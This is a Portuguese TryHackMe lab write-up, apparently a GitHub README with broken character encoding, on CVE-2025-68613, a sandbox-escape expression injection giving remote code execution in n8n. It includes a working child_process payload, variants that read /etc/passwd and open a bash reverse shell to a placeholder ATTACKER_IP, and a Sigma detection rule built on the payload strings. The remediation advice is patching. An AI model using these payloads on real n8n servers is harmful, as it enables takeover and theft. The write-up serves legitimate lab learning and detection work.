# üö© CVE-2025-68613 - n8n Expression Injection RCE

Write-up t√©cnico da vulnerabilidade CVE-2025-68613, explorada durante o laborat√≥rio pr√°tico do TryHackMe. Esta falha afeta o n8n (plataforma de automa√ß√£o de workflows) permitindo Execu√ß√£o Remota de C√≥digo (RCE) por usu√°rios autenticados.

![Security](https://img.shields.io/badge/Security-CVE--2025--68613-critical)
![n8n](https://img.shields.io/badge/n8n-0.211.0--1.120.3-red)
![CVSS](https://img.shields.io/badge/CVSS-9.9-critical)

## üìù Descri√ß√£o da Vulnerabilidade

A vulnerabilidade √© uma **inje√ß√£o de express√£o JavaScript** no sistema de avalia√ß√£o de workflows do n8n. O erro ocorre na falta de isolamento (sandboxing) do motor de execu√ß√£o de express√µes envolvidas em chaves duplas `{{ }}`.

Isso permite que um atacante autenticado "escape" do contexto limitado e acesse o ambiente global do Node.js, executando comandos arbitr√°rios no servidor com os privil√©gios do processo n8n.

### Vers√µes Vulner√°veis

- **n8n:** 0.211.0 at√© 1.120.3
- **Vers√µes Corrigidas:** 1.120.4, 1.121.1, 1.122.0+

---

## üéØ O que √© n8n?

n8n √© uma plataforma open-source de automa√ß√£o de fluxo de trabalho que permite conectar visualmente aplica√ß√µes e servi√ßos. √â comumente usado para:

- Automatizar tarefas operacionais repetitivas
- Integrar ferramentas de seguran√ßa e plataformas SaaS
- Construir fluxos de trabalho complexos com 400+ integra√ß√µes nativas

**Configura√ß√µes t√≠picas de implanta√ß√£o:**
1. **Inst√¢ncias auto-hospedadas** (on-premises ou nuvem privada)
2. **Hospedagem em nuvem** (servi√ßo gerenciado n8n.cloud)
3. **Ferramentas de automa√ß√£o internas** (dentro de redes corporativas)

---

## üöÄ Explora√ß√£o Passo a Passo

### 1. Prepara√ß√£o do Ambiente

**Acesso ao Lab:**
- **Target:** `http://MACHINE_IP:5678`
- **Credenciais:**
  - Email: `tryhackme@thm.local`
  - Senha: `Try12345!`

### 2. Cria√ß√£o do Workflow Malicioso

**Passo 1:** Acesse a inst√¢ncia n8n e fa√ßa login

**Passo 2:** Crie um novo workflow
- Clique em "Start from scratch" (Come√ßar do zero)

![Criar Workflow](1.png)

**Passo 3:** Adicione um n√≥ Manual Trigger
- Clique em "Add first step" (Adicionar primeiro passo)
- Busque e selecione "Manual Trigger"

![Manual Trigger](2.png)

**Passo 4:** Adicione um n√≥ Edit Fields (Set)
- Anexe-o ao Manual Trigger
- Selecione a op√ß√£o "Edit Fields (Set)"

![Edit Fields](3.png)

### 3. O Payload Malicioso

**Passo 5:** Injete o payload de explora√ß√£o

- Clique em "Add Field" (Adicionar Campo)
- Defina o nome: `exploit`
- Defina o valor com o payload:

```javascript
{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

![Payload Injection](4.png)

### 4. Detalhamento do Payload

Vamos analisar cada componente do exploit:

#### Fun√ß√£o An√¥nima Imediata
```javascript
(function(){ ... })()
```
Cria e executa imediatamente uma fun√ß√£o an√¥nima para encapsular a l√≥gica do exploit.

#### Cadeia de Escala√ß√£o de Contexto
```javascript
this.process.mainModule
```
- **`this`** ‚Üí acessa o objeto global do Node.js
- **`process`** ‚Üí global do Node.js fornecendo acesso a processos do sistema
- **`mainModule`** ‚Üí referencia o m√≥dulo raiz, contornando restri√ß√µes do sandbox

#### Carregamento de M√≥dulo Perigoso
```javascript
.require('child_process')
```
Usa o `require()` do Node.js para carregar o m√≥dulo `child_process`, que **nunca deveria estar acess√≠vel** para express√µes de usu√°rios.

#### Execu√ß√£o de Comando
```javascript
.execSync('id')
```
Executa o comando `id` de forma s√≠ncrona, que exibe informa√ß√µes de identidade do usu√°rio (UID, GID, grupos).

#### Recupera√ß√£o de Sa√≠da
```javascript
.toString()
```
Converte a sa√≠da Buffer do `execSync()` para uma string leg√≠vel.

### 5. Execu√ß√£o e Resultado

**Passo 6:** Execute e observe os resultados
- Clique em "Execute step" (Executar passo)
- A sa√≠da exibir√°: `uid=1000(node) gid=1000(node) groups=1000(node)`

![Resultado do RCE](5.png)

*Confirma√ß√£o de execu√ß√£o remota de c√≥digo - comando `id` executado com sucesso no servidor.*

---

## üîß Comandos Alternativos

Voc√™ pode substituir `id` por qualquer comando do sistema:

### Listar arquivos
```javascript
{{ (function(){ return this.process.mainModule.require('child_process').execSync('ls -la').toString() })() }}
```

### Ler arquivos sens√≠veis
```javascript
{{ (function(){ return this.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() })() }}
```

![Cat Flag](10.png)

### Obter informa√ß√µes do sistema
```javascript
{{ (function(){ return this.process.mainModule.require('child_process').execSync('uname -a').toString() })() }}
```

### Estabelecer reverse shell
```javascript
{{ (function(){ return this.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"').toString() })() }}
```

---

## üõ°Ô∏è Detec√ß√£o e Mitiga√ß√£o

### Detec√ß√£o via Regra Sigma

Regra para identificar tentativas de explora√ß√£o via logs de proxy:

```yaml
title: Tentativa de RCE no N8N via Workflow
status: experimental
description: Detecta tentativas de injetar express√µes JavaScript em payloads de workflow n8n que executam comandos do SO
author: TryHackMe Content Engineering Team
references:
  - https://github.com/wioui/n8n-CVE-2025-68613-exploit
date: 2025-12-23
tags:
  - attack.execution
  - attack.t1059.007
logsource:
  category: webserver
  product: generic
detection:
  selection:
    cs-method: POST
    cs-uri-stem|endswith: /rest/workflows
  keywords:
    - "this.process.mainModule.require('child_process')"
    - ".execSync("
    - "={{ (function(){"
    - "toString() })()"
  condition: selection and all of keywords
falsepositives:
  - Testes de seguran√ßa / simula√ß√µes red team
  - Desenvolvedores armazenando essas strings exatas em campos logados
level: high
```

### Configura√ß√£o de Logging no Proxy (nginx)

Para capturar requisi√ß√µes maliciosas, configure o nginx para logar o corpo das requisi√ß√µes:

```nginx
http {
    lua_package_path "/etc/nginx/lua/?.lua;;";
    
    log_format detailed '$remote_addr - $remote_user [$time_local] '
                       '"$request" $status $body_bytes_sent '
                       '"$http_referer" "$http_user_agent" '
                       'Request-Body: "$request_body" '
                       'Content-Type: "$http_content_type" '
                       'Duration: $request_time s';
}
```

### Monitoramento P√≥s-Explora√ß√£o

Monitore execu√ß√µes suspeitas de processos que podem indicar explora√ß√£o:

- ‚úÖ Estabelecimento de reverse shell
- ‚úÖ Downloads de payloads maliciosos
- ‚úÖ Comandos de reconhecimento (`whoami`, `id`, `uname`, `ls`, `ps`)
- ‚úÖ Tentativas de escala√ß√£o de privil√©gios
- ‚úÖ Atividades de movimento lateral

**üí° Melhor Pr√°tica:** Correlacione detec√ß√µes de logs web com eventos de cria√ß√£o de processos para cobertura abrangente.

---

## üîß Remedia√ß√£o

### A√ß√µes Imediatas

1. **Atualizar imediatamente** para as vers√µes corrigidas:
   - ‚úÖ n8n 1.120.4
   - ‚úÖ n8n 1.121.1
   - ‚úÖ n8n 1.122.0 ou posterior

2. **Audite workflows existentes** em busca de express√µes suspeitas

3. **Revise logs de acesso** para indicadores de explora√ß√£o

4. **Implemente segmenta√ß√£o de rede** para limitar o raio de impacto

### Mitiga√ß√µes de Longo Prazo

- Habilite sandboxing adequado para avalia√ß√£o de express√µes
- Implemente valida√ß√£o e sanitiza√ß√£o de entrada rigorosa
- Aplique princ√≠pio do menor privil√©gio para processos n8n
- Implante regras de Web Application Firewall (WAF)
- Monitore padr√µes an√¥malos de execu√ß√£o de workflows

---

## üîó Refer√™ncias e Ferramentas

- **TryHackMe Room:** [n8n CVE-2025-68613](https://tryhackme.com/)
- **PoC Original:** [wioui - n8n-CVE-2025-68613-exploit](https://github.com/wioui/n8n-CVE-2025-68613-exploit)
- **Documenta√ß√£o n8n:** [Logging & Monitoring](https://docs.n8n.io/hosting/logging-monitoring/)
- **Aviso de Seguran√ßa:** [n8n Security](https://n8n.io/security)
- **Burp Suite:** [PortSwigger](https://portswigger.net/burp) 

---

## ‚ö†Ô∏è Aviso Legal

Este conte√∫do possui **fins exclusivamente educacionais** e foi realizado em ambiente controlado do TryHackMe. A explora√ß√£o de vulnerabilidades em sistemas sem autoriza√ß√£o √© ilegal e pode resultar em consequ√™ncias criminais.

---

## üë§ Autor

**[iceShaher]**
- TryHackMe: [@iceShaher](https://tryhackme.com/p/iceShaher)

